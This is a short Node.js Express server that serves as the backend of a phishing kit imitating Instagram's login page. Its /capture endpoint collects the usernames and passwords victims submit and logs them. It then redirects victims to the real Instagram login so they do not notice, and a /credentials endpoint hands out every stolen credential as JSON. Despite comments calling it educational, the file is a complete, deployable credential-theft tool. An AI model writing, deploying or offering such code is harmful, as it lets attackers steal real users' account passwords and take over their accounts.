const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const PORT = 8080;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Array to store captured credentials (for educational purposes)
const capturedCredentials = [];

// Serve the Instagram-like login page
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

// Endpoint to capture credentials
app.post("/capture", (req, res) => {
  const { username, password } = req.body;

  // Store the captured credentials in memory (you can log them or store them as needed)
  capturedCredentials.push({ username, password });

  console.log("Captured Credentials:", capturedCredentials); // Print to console for demo purposes

  // Redirect the user to Instagram's actual login page
  res.redirect("https://www.instagram.com/accounts/login/");
});

// Endpoint to get captured credentials
app.get("/credentials", (req, res) => {
  res.json(capturedCredentials); // Send the credentials as JSON response
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
});